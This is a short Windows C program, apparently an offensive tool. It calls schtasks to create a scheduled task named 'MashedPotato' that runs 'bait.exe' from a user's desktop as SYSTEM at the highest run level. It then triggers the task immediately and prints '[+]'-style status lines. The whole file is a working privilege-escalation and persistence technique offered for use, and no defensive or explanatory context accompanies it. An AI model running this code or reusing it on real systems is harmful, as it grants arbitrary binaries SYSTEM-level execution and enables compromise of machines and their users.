#include <windows.h>
#include <stdio.h>

int main() {
    wchar_t createCmd[1024] = L"schtasks /create /tn MashedPotato /tr \"C:\\Users\\normal.user\\Desktop\\bait.exe\" /sc once /st 00:00 /ru SYSTEM /rl highest /f";
    wchar_t runCmd[128]     = L"schtasks /run /tn MashedPotato";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    BOOL created = CreateProcessW(NULL, createCmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (created) {
        printf("[+] SYSTEM task created.\n");
        Sleep(2000);

        BOOL triggered = CreateProcessW(NULL, runCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        if (triggered) {
            printf("[+] SYSTEM task triggered.\n");
        } else {
            printf("[-] Failed to trigger task: %lu\n", GetLastError());
        }
    } else {
        printf("[-] Failed to create task: %lu\n", GetLastError());
    }

    return 0;
}
